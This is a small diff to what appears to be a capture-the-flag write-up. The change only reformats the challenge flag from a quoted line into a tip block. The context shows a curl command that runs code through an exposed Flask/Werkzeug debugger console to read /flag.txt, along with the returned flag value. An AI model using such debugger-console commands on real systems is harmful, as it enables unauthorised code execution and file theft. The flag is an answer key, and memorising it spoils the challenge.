@@ -241,5 +241,7 @@ Command: curl 0:8000\"/console?&__debugger__=yes&cmd=open('/flag.txt').read()&fr
 <span class="string">&#39;flag{gYDTW6Avx6q6HCc7pEBKRW3AoWDYa8xu}\n&#39;</span>
 ```
 
-> Flag: `flag{gYDTW6Avx6q6HCc7pEBKRW3AoWDYa8xu}`
+::: tip Flag
+`flag{gYDTW6Avx6q6HCc7pEBKRW3AoWDYa8xu}`
+:::
 
